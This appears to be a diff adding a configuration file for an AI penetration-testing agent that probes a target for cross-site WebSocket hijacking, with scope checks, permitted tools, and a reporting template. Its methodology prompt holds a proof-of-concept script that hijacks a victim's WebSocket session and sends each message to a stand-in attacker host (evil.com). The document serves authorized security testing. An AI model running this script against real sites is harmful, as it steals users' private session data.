@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/websocket_hijacking",
+  "version": "1.0.0",
+  "title": "WebSocket Hijacking Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-1385"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "read_only",
+  "methodology": "# WebSocket Hijacking Specialist Agent\n## User Prompt\nYou are testing **{target}** for Cross-Site WebSocket Hijacking (CSWSH).\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify WebSocket Endpoints\n- Look for `ws://` or `wss://` connections\n- Common paths: `/ws`, `/socket`, `/websocket`, `/realtime`, `/cable`\n- Check for Socket.IO: `/socket.io/?EIO=4&transport=websocket`\n### 2. Test Origin Validation\n- Connect from different origin (evil.com)\n- Check if Origin header is validated during upgrade\n- Try without Origin header\n### 3. Test Authentication\n- Connect without cookies/tokens\n- Use expired session cookie\n- Check if messages require per-message auth\n### 4. Cross-Site WebSocket Hijacking PoC\n```html\n<script>\nvar ws = new WebSocket('wss://target.com/ws');\nws.onmessage = function(e) {\n  fetch('https://evil.com/log', {method:'POST', body:e.data});\n};\nws.onopen = function() { ws.send('{\"action\":\"get_profile\"}'); };\n</script>\n```\n### 5. Report\n```\nFINDING:\n- Title: WebSocket Hijacking at [endpoint]\n- Severity: High\n- CWE: CWE-1385\n- Endpoint: [ws URL]\n- Origin Validated: [yes/no]\n- Auth Required: [yes/no]\n- Data Accessible: [what data]\n- Impact: Real-time data theft, message injection\n- Remediation: Validate Origin header, require auth per-connection\n```\n## System Prompt\nYou are a WebSocket Hijacking specialist. CSWSH is confirmed when a cross-origin page can establish a WebSocket connection and read/write data using the victim's session. The WebSocket must relay authenticated data. Public WebSockets with no auth data are not CSWSH targets.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/websocket_hijacking.md",
+  "warnings": []
+}
